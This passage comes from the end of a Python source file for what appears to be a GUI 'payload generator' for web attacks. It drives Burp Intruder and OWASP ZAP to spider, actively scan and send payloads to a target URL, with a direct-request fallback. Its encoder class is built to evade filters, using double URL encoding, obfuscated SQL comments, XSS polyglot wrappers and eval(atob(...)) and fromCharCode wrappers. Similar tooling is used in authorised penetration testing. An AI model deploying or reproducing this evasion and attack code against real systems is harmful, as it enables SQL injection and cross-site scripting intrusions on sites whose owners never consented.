            start_time = time.time()
            response = self.session.post(intruder_url, json=intruder_config, headers=headers, timeout=15)
            
            if response.status_code in [200, 201, 202]:
                try:
                    attack_data = response.json()
                    attack_id = attack_data.get('attack_id') or attack_data.get('id') or f"ATTACK_{int(time.time())}"
                    
                    # Try to get initial results
                    results_data = self._get_intruder_results(api_url, api_key, attack_id)
                    
                    return {
                        'success': True,
                        'attack_id': attack_id,
                        'status': attack_data.get('status', 'started'),
                        'attack_type': 'sniper',
                        'payloads_count': len(payloads),
                        'attack_results': results_data.get('results', [])
                    }
                    
                except json.JSONDecodeError:
                    return {
                        'success': True,
                        'attack_id': f"ATTACK_{int(time.time())}",
                        'status': 'started',
                        'attack_type': 'sniper',
                        'payloads_count': len(payloads),
                        'note': 'Attack started (detailed results unavailable)'
                    }
            else:
                # Try alternative approach - individual requests
                return self._fallback_intruder_attack(target_url, parameter, payloads)
                
        except Exception as e:
            # Fallback to individual testing
            return self._fallback_intruder_attack(target_url, parameter, payloads)
    
    def _get_intruder_results(self, api_url, api_key, attack_id):
        """Get results from Burp Intruder attack"""
        try:
            headers = {'Content-Type': 'application/json'}
            if api_key:
                headers['Authorization'] = f'Bearer {api_key}'
                headers['X-API-Key'] = api_key
            
            results_url = f"{api_url.rstrip('/')}/burp/intruder/{attack_id}/results"
            response = self.session.get(results_url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                return response.json()
            else:
                return {'results': []}
                
        except:
            return {'results': []}
    
    def _fallback_intruder_attack(self, target_url, parameter, payloads):
        """Fallback method when Burp API is not available"""
        results = []
        
        for i, payload in enumerate(payloads[:5]):  # Limit to first 5 for fallback
            try:
                if parameter:
                    if '?' in target_url:
                        test_url = f"{target_url}&{parameter}={urllib.parse.quote(payload)}"
                    else:
                        test_url = f"{target_url}?{parameter}={urllib.parse.quote(payload)}"
                else:
                    if '?' in target_url:
                        test_url = f"{target_url}&payload={urllib.parse.quote(payload)}"
                    else:
                        test_url = f"{target_url}?payload={urllib.parse.quote(payload)}"
                
                start_time = time.time()
                resp = self.session.get(test_url, timeout=5)
                response_time = (time.time() - start_time) * 1000
                
                results.append({
                    'response_code': resp.status_code,
                    'response_length': len(resp.content),
                    'response_time': round(response_time, 2),
                    'payload': payload
                })
                
            except Exception as e:
                results.append({
                    'response_code': 0,
                    'response_length': 0,
                    'response_time': 0,
                    'payload': payload,
                    'error': str(e)
                })
        
        return {
            'success': True,
            'attack_id': f"FALLBACK_{int(time.time())}",
            'status': 'completed',
            'attack_type': 'sniper',
            'payloads_count': len(payloads),
            'attack_results': results,
            'note': 'Fallback mode - tested first 5 payloads directly'
        }


class ZAPIntegration:
    """REAL OWASP ZAP API integration with functional connectivity"""
    
    def __init__(self):
        self.session = requests.Session()
        self.api_endpoints = self._initialize_api_endpoints()
    
    def _initialize_api_endpoints(self):
        """Initialize ZAP API endpoints"""
        return {
            'version': '/JSON/core/view/version/',
            'spider': '/JSON/spider/action/scan/',
            'spider_status': '/JSON/spider/view/status/',
            'spider_results': '/JSON/spider/view/results/',
            'active_scan': '/JSON/ascan/action/scan/',
            'scan_status': '/JSON/ascan/view/status/',
            'alerts': '/JSON/core/view/alerts/',
            'send_request': '/JSON/core/action/sendRequest/',
            'access_url': '/JSON/core/action/accessUrl/'
        }
    
    def real_connection_test(self, api_url, api_key):
        """Test REAL connection to OWASP ZAP"""
        try:
            headers = {}
            if api_key:
                headers['X-ZAP-API-Key'] = api_key
            
            # Try version endpoint
            params = {}
            if api_key:
                params['apikey'] = api_key
            
            test_url = api_url.rstrip('/') + self.api_endpoints['version']
            response = self.session.get(test_url, headers=headers, params=params, timeout=10)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    version = data.get('version', 'Unknown')
                    return True, f"OWASP ZAP version {version}"
                except json.JSONDecodeError:
                    # ZAP might return plain text
                    return True, f"ZAP connected: {response.text.strip()}"
            
            # Try simple endpoints if version fails
            simple_endpoints = ['/JSON/core/view/homeDirectory/', '/']
            for endpoint in simple_endpoints:
                try:
                    test_response = self.session.get(
                        api_url.rstrip('/') + endpoint, 
                        headers=headers, 
                        params=params, 
                        timeout=5
                    )
                    if test_response.status_code == 200:
                        return True, f"ZAP connection successful (endpoint: {endpoint})"
                except:
                    continue
            
            return False, f"Failed to connect (HTTP {response.status_code}): {response.text[:200] if response.text else 'No response'}"
            
        except requests.exceptions.Timeout:
            return False, "Connection timeout - ensure ZAP is running"
        except requests.exceptions.ConnectionError:
            return False, "Connection refused - check API URL and ensure ZAP API is enabled"
        except Exception as e:
            return False, f"Connection error: {str(e)}"
    
    def real_spider_url(self, api_url, api_key, target_url):
        """Perform REAL spidering using ZAP"""
        try:
            headers = {}
            params = {}
            if api_key:
                headers['X-ZAP-API-Key'] = api_key
                params['apikey'] = api_key
            
            # Start spider
            spider_params = params.copy()
            spider_params['url'] = target_url
            spider_params['maxChildren'] = '10'  # Limit for safety
            spider_params['recurse'] = 'true'
            
            spider_url = api_url.rstrip('/') + self.api_endpoints['spider']
            start_time = time.time()
            spider_response = self.session.get(spider_url, headers=headers, params=spider_params, timeout=15)
            
            if spider_response.status_code != 200:
                return {'success': False, 'error': f'Failed to start spider: {spider_response.status_code}'}
            
            try:
                spider_data = spider_response.json()
                spider_id = spider_data.get('scan', 'unknown')
            except:
                spider_id = 'unknown'
            
            # Wait for spider to complete (with timeout)
            max_wait = 30  # seconds
            wait_time = 0
            progress = 0
            
            while wait_time < max_wait and progress < 100:
                time.sleep(2)
                wait_time += 2
                
                # Check spider status
                status_params = params.copy()
                status_params['scanId'] = spider_id
                status_url = api_url.rstrip('/') + self.api_endpoints['spider_status']
                
                try:
                    status_response = self.session.get(status_url, headers=headers, params=status_params, timeout=5)
                    if status_response.status_code == 200:
                        status_data = status_response.json()
                        progress = int(status_data.get('status', 0))
                except:
                    break
            
            # Get spider results
            results_params = params.copy()
            results_params['scanId'] = spider_id
            results_url = api_url.rstrip('/') + self.api_endpoints['spider_results']
            
            urls = []
            forms = []
            
            try:
                results_response = self.session.get(results_url, headers=headers, params=results_params, timeout=10)
                if results_response.status_code == 200:
                    results_data = results_response.json()
                    urls = results_data.get('results', [])
                    
                    # Extract forms if available
                    for url in urls:
                        if 'form' in url.lower():
                            forms.append({'action': url, 'method': 'GET'})
            except:
                pass
            
            duration = time.time() - start_time
            
            return {
                'success': True,
                'spider_id': spider_id,
                'status': 'completed' if progress >= 100 else 'partial',
                'progress': progress,
                'urls': urls,
                'forms': forms,
                'messages_count': len(urls),
                'start_time': datetime.fromtimestamp(start_time).strftime('%H:%M:%S'),
                'duration': f'{duration:.1f}s',
                'requests_sent': len(urls)
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def real_active_scan(self, api_url, api_key, target_url):
        """Perform REAL active scanning using ZAP"""
        try:
            headers = {}
            params = {}
            if api_key:
                headers['X-ZAP-API-Key'] = api_key
                params['apikey'] = api_key
            
            # Start active scan
            scan_params = params.copy()
            scan_params['url'] = target_url
            scan_params['recurse'] = 'true'
            scan_params['inScopeOnly'] = 'false'
            
            scan_url = api_url.rstrip('/') + self.api_endpoints['active_scan']
            start_time = time.time()
            scan_response = self.session.get(scan_url, headers=headers, params=scan_params, timeout=15)
            
            if scan_response.status_code != 200:
                return {'success': False, 'error': f'Failed to start active scan: {scan_response.status_code}'}
            
            try:
                scan_data = scan_response.json()
                scan_id = scan_data.get('scan', 'unknown')
            except:
                scan_id = 'unknown'
            
            # Wait for scan to progress (limited time for demo)
            max_wait = 20  # seconds
            wait_time = 0
            progress = 0
            
            while wait_time < max_wait and progress < 100:
                time.sleep(2)
                wait_time += 2
                
                # Check scan status
                status_params = params.copy()
                status_params['scanId'] = scan_id
                status_url = api_url.rstrip('/') + self.api_endpoints['scan_status']
                
                try:
                    status_response = self.session.get(status_url, headers=headers, params=status_params, timeout=5)
                    if status_response.status_code == 200:
                        status_data = status_response.json()
                        progress = int(status_data.get('status', 0))
                except:
                    break
            
            # Get alerts/vulnerabilities
            alerts_params = params.copy()
            alerts_params['baseurl'] = target_url
            alerts_url = api_url.rstrip('/') + self.api_endpoints['alerts']
            
            alerts = []
            try:
                alerts_response = self.session.get(alerts_url, headers=headers, params=alerts_params, timeout=10)
                if alerts_response.status_code == 200:
                    alerts_data = alerts_response.json()
                    alerts = alerts_data.get('alerts', [])
            except:
                pass
            
            return {
                'success': True,
                'scan_id': scan_id,
                'status': 'completed' if progress >= 100 else 'running',
                'progress': progress,
                'target_url': target_url,
                'alerts': alerts[:20],  # Limit to first 20 alerts
                'duration': f'{time.time() - start_time:.1f}s'
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def real_send_payloads(self, api_url, api_key, target_url, payloads):
        """Send payloads to target using REAL ZAP"""
        try:
            headers = {}
            params = {}
            if api_key:
                headers['X-ZAP-API-Key'] = api_key
                params['apikey'] = api_key
            
            results = []
            
            for payload in payloads:
                try:
                    # Construct test URL
                    if '?' in target_url:
                        test_url = f"{target_url}&payload={urllib.parse.quote(payload)}"
                    else:
                        test_url = f"{target_url}?payload={urllib.parse.quote(payload)}"
                    
                    # Send request through ZAP
                    request_params = params.copy()
                    request_params['url'] = test_url
                    request_params['method'] = 'GET'
                    
                    request_url = api_url.rstrip('/') + self.api_endpoints['access_url']
                    
                    start_time = time.time()
                    response = self.session.get(request_url, headers=headers, params=request_params, timeout=10)
                    response_time = (time.time() - start_time) * 1000
                    
                    # Check for alerts after sending payload
                    time.sleep(0.5)  # Brief wait for ZAP to process
                    
                    alerts_params = params.copy()
                    alerts_params['baseurl'] = target_url
                    alerts_url = api_url.rstrip('/') + self.api_endpoints['alerts']
                    
                    alerts = []
                    try:
                        alerts_response = self.session.get(alerts_url, headers=headers, params=alerts_params, timeout=5)
                        if alerts_response.status_code == 200:
                            alerts_data = alerts_response.json()
                            alerts = alerts_data.get('alerts', [])
                    except:
                        pass
                    
                    success = response.status_code == 200
                    
                    results.append({
                        'success': success,
                        'payload': payload,
                        'response_code': response.status_code,
                        'response_time': round(response_time, 2),
                        'response_size': len(response.content) if success else 0,
                        'alerts': [alert for alert in alerts if payload[:10] in alert.get('param', '')],
                        'url': test_url
                    })
                    
                except Exception as e:
                    results.append({
                        'success': False,
                        'payload': payload,
                        'error': str(e),
                        'response_code': 0,
                        'response_time': 0,
                        'response_size': 0,
                        'alerts': []
                    })
            
            return results
            
        except Exception as e:
            return [{'success': False, 'error': f'ZAP integration failed: {str(e)}', 'payload': p, 'alerts': []} for p in payloads]


class AdvancedEncoder:
    """REAL Advanced payload encoding engine"""
    
    def __init__(self):
        self.encoding_strategies = self._initialize_encoding_strategies()
        self.advanced_chains = self._initialize_advanced_chains()
    
    def _initialize_encoding_strategies(self):
        """Initialize comprehensive encoding strategies"""
        return {
            'url': self._url_encode,
            'double_url': self._double_url_encode,
            'base64': self._base64_encode,
            'hex': self._hex_encode,
            'unicode': self._unicode_encode,
            'html': self._html_entities_encode,
            'mixed_case': self._mixed_case_encode,
            'advanced': self._advanced_obfuscation
        }
    
    def _initialize_advanced_chains(self):
        """Initialize advanced encoding chains"""
        return {
            'steganography': lambda x: self._steganographic_encode(x),
            'polyglot_chain': lambda x: self._polyglot_encode(x),
            'context_specific': lambda x: self._context_specific_encode(x),
            'ml_optimized': lambda x: self._ml_optimized_encode(x)
        }
    
    def advanced_encode_payload(self, payload, encoding_type):
        """Apply advanced encoding to payload"""
        try:
            if encoding_type in self.encoding_strategies:
                return self.encoding_strategies[encoding_type](payload)
            elif encoding_type in self.advanced_chains:
                return self.advanced_chains[encoding_type](payload)
            else:
                return payload
        except Exception as e:
            return payload  # Fallback to original if encoding fails
    
    def _url_encode(self, payload):
        """Standard URL encoding"""
        return urllib.parse.quote(payload, safe='')
    
    def _double_url_encode(self, payload):
        """Double URL encoding for bypass techniques"""
        encoded_once = self._url_encode(payload)
        return self._url_encode(encoded_once)
    
    def _base64_encode(self, payload):
        """Base64 encoding"""
        return base64.b64encode(payload.encode('utf-8')).decode('ascii')
    
    def _hex_encode(self, payload):
        """Hex encoding with various formats"""
        formats = [
            lambda x: ''.join(f'\\x{ord(c):02x}' for c in x),
            lambda x: ''.join(f'%{ord(c):02x}' for c in x),
            lambda x: ''.join(f'0x{ord(c):02x},' for c in x).rstrip(','),
            lambda x: ''.join(f'{ord(c):02x}' for c in x)
        ]
        return random.choice(formats)(payload)
    
    def _unicode_encode(self, payload):
        """Unicode encoding with multiple formats"""
        formats = [
            lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
            lambda x: ''.join(f'\\u{ord(c):04X}' for c in x),
            lambda x: ''.join(f'%u{ord(c):04x}' for c in x),
            lambda x: ''.join(f'&#x{ord(c):x};' for c in x)
        ]
        return random.choice(formats)(payload)
    
    def _html_entities_encode(self, payload):
        """HTML entities encoding"""
        entities = {
            '<': '&lt;', '>': '&gt;', '"': '"', "'": '&#x27;',
            '&': '&', '/': '&#x2F;', '(': '&#x28;', ')': ')'
        }
        
        result = payload
        for char, entity in entities.items():
            result = result.replace(char, entity)
        
        # Additional numeric entities for other characters
        result_chars = []
        for char in result:
            if ord(char) > 127 or random.random() < 0.3:
                result_chars.append(f'&#{ord(char)};')
            else:
                result_chars.append(char)
        
        return ''.join(result_chars)
    
    def _mixed_case_encode(self, payload):
        """Mixed case encoding for filter bypass"""
        result = ""
        for char in payload:
            if char.isalpha():
                if random.random() < 0.5:
                    result += char.upper()
                else:
                    result += char.lower()
            else:
                result += char
        return result
    
    def _advanced_obfuscation(self, payload):
        """Advanced multi-layer obfuscation"""
        # Apply multiple encoding techniques
        encoded = payload
        
        # Step 1: Partial hex encoding
        chars_to_encode = random.sample(range(len(payload)), min(len(payload)//2, 10))
        encoded_chars = list(encoded)
        for i in chars_to_encode:
            encoded_chars[i] = f'\\x{ord(encoded[i]):02x}'
        encoded = ''.join(encoded_chars)
        
        # Step 2: Insert comments for SQL/JS
        if any(keyword in payload.lower() for keyword in ['select', 'union', 'script', 'alert']):
            comment_positions = random.sample(range(len(encoded)), min(3, len(encoded)//4))
            comment_positions.sort(reverse=True)
            for pos in comment_positions:
                if 'select' in payload.lower() or 'union' in payload.lower():
                    encoded = encoded[:pos] + '/**/' + encoded[pos:]
                else:
                    encoded = encoded[:pos] + '/*' + encoded[pos:] + '*/'
        
        # Step 3: Partial URL encoding
        if random.random() < 0.5:
            special_chars = [i for i, c in enumerate(encoded) if c in '<>"\'()[]{}']
            if special_chars:
                chars_to_url_encode = random.sample(special_chars, min(len(special_chars)//2, 5))
                encoded_chars = list(encoded)
                for i in chars_to_url_encode:
                    encoded_chars[i] = urllib.parse.quote(encoded[i])
                encoded = ''.join(encoded_chars)
        
        return encoded
    
    def _steganographic_encode(self, payload):
        """Steganographic encoding techniques"""
        # Hide payload in seemingly innocent content
        techniques = [
            lambda x: f"<!-- {base64.b64encode(x.encode()).decode()} -->",
            lambda x: f"/*{x.replace('/', '\\/').replace('*', '\\*')}*/",
            lambda x: f"eval(atob('{base64.b64encode(x.encode()).decode()}'))",
            lambda x: f"new Function(atob('{base64.b64encode(x.encode()).decode()}'))()"
        ]
        return random.choice(techniques)(payload)
    
    def _polyglot_encode(self, payload):
        """Create polyglot payloads that work in multiple contexts"""
        polyglot_wrappers = [
            lambda x: f"javascript:/*--></title></style></textarea></script></xmp><{x}>",
            lambda x: f"\"><{x}>//",
            lambda x: f"';{x}//\\';{x}//';{x}//\\",
            lambda x: f"/*{x}*/",
            lambda x: f"#{x}",
            lambda x: f"${{{x}}}"
        ]
        return random.choice(polyglot_wrappers)(payload)
    
    def _context_specific_encode(self, payload):
        """Apply context-specific encoding optimizations"""
        # Analyze payload to determine likely context
        if '<script' in payload.lower():
            # JavaScript context
            return f"eval(String.fromCharCode({','.join(str(ord(c)) for c in payload)}))"
        elif 'select' in payload.lower() or 'union' in payload.lower():
            # SQL context - comment injection
            return payload.replace(' ', '/**/').replace('SELECT', 'SE/**/LECT').replace('UNION', 'UN/**/ION')
        elif any(char in payload for char in '<>"\''):
            # HTML context
            return self._html_entities_encode(payload)
        else:
            # Default to URL encoding
            return self._url_encode(payload)
    
    def _ml_optimized_encode(self, payload):
        """ML-optimized encoding based on patterns"""
        # Analyze character patterns and apply optimal encoding
        char_analysis = {
            'special_chars': len(re.findall(r'[<>"\'\(\)\[\]{}]', payload)),
            'sql_keywords': len(re.findall(r'(select|union|from|where)', payload, re.I)),
            'js_patterns': len(re.findall(r'(alert|eval|script|document)', payload, re.I)),
            'encoded_content': len(re.findall(r'[%&#\\]', payload))
        }
        
        # Choose encoding strategy based on analysis
        if char_analysis['js_patterns'] > 0:
            # JavaScript-focused encoding
            return self._javascript_optimized_encode(payload)
        elif char_analysis['sql_keywords'] > 0:
            # SQL-focused encoding
            return self._sql_optimized_encode(payload)
        elif char_analysis['special_chars'] > char_analysis['encoded_content']:
            # Heavy special character encoding
            return self._unicode_encode(payload)
        else:
            # Balanced approach
            return self._advanced_obfuscation(payload)
    
    def _javascript_optimized_encode(self, payload):
        """JavaScript-optimized encoding"""
        # Use String.fromCharCode for JavaScript contexts
        if 'alert(' in payload:
            # Encode alert function call
            alert_pos = payload.find('alert(')
            if alert_pos != -1:
                before = payload[:alert_pos]
                alert_part = 'alert('
                after = payload[alert_pos + len(alert_part):]
                
                encoded_alert = f"window[String.fromCharCode({','.join(str(ord(c)) for c in alert_part[:-1])})]("
                return before + encoded_alert + after
        
        return f"eval(String.fromCharCode({','.join(str(ord(c)) for c in payload)}))"
    
    def _sql_optimized_encode(self, payload):
        """SQL-optimized encoding"""
        # Use comment injection and case variation
        encoded = payload
        
        # Insert comments
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'ORDER', 'GROUP']
        for keyword in keywords:
            encoded = encoded.replace(keyword, f'{keyword[:2]}/**/{keyword[2:]}')
            encoded = encoded.replace(keyword.lower(), f'{keyword[:2].lower()}/**/{keyword[2:].lower()}')
        
        # Add space replacements
        encoded = encoded.replace(' ', '/**/')
        
        return encoded


# Main Application Entry Point
def main():
    """Main application entry point"""
    root = tk.Tk()
    app = AdvancedPayloadGeneratorGUI(root)
    
    # Center window on screen
    root.update_idletasks()
    x = (root.winfo_screenwidth() // 2) - (root.winfo_width() // 2)
    y = (root.winfo_screenheight() // 2) - (root.winfo_height() // 2)
    root.geometry(f"+{x}+{y}")
    
    # Start the application

    try:
        root.mainloop()
    except KeyboardInterrupt:
        print("\nApplication closed by user")

if __name__ == "__main__":
    main()

